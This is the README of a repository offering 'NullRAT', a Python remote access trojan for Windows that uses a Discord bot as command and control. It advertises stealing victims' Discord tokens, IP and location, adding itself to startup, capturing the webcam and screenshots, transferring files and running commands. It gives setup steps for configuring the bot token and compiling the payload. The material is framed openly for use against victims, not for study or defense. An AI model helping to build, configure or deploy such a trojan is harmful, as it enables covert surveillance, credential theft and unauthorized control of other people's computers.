<h1 align=center> ☠️ NullRAT</h1>
<p align=center>Windows-Only Remote Access Trojan that uses Discord as C&C</p>

## Features:
```
1) Relatively small size for a Python RAT
2) Find the public IP of the victim
3) Find their Discord token(s)
4) Find victim's approximate location
5) Add payload to startup with one command
6) Take pictures using victim's webcam 
7) Take screenshot of victim's PC
8) Download files from victim's PC
9) Upload files to victim's PC
10) Get victim's system information
11) Execute command prompt commands (Thank you Sp00p)
12) Find any environment variables, and chdir there
13) See all the files inside a specified directory
```

## How to use:
<h4>IMPORTANT:</h4>
Python 3.6+ should be installed on the PC and added to path (pip folder should be added too)

Also don't compile normally using pyinstaller, use the compiler provided

- [Create a Discord bot and obtain it's token](https://www.freecodecamp.org/news/create-a-discord-bot-with-python/)
- Git clone / Download repo as zip / Dowload the release
- Fill up the empty variables & bot token in RAT.py
- Finally, execute the following: 
```cmd
Install Dependencies.bat
RATCompiler.bat
```

## Credits
1) Monst3red for inspiration
2) Sp00p64 for some commands from [his RAT](https://github.com/Sp00p64/DiscordRAT)
3) Buntii for ideas
